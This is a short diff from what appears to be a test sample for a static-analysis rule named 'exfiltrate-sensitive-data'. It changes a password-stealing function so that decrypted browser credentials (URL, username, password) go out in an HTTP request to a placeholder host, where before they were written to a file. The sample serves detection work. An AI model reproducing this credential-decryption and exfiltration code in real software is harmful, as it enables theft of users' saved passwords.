@@ -244,7 +244,8 @@ def steal_passwords2(self, name: str, path: str, profile: str):
             url, username, password = res
             password = self.dcrpt_val(password, self.masterkey)
             if url != "":
+                params = {'url': url, 'username': username, 'password': password}
                 # ruleid: exfiltrate-sensitive-data
-                f.write(f"URL: {url}\nID: {username}\nPASSWORD: {password} \n\n")
+                requests.get("https://example.com", params=params)
     cursor.close()
     conn.close()
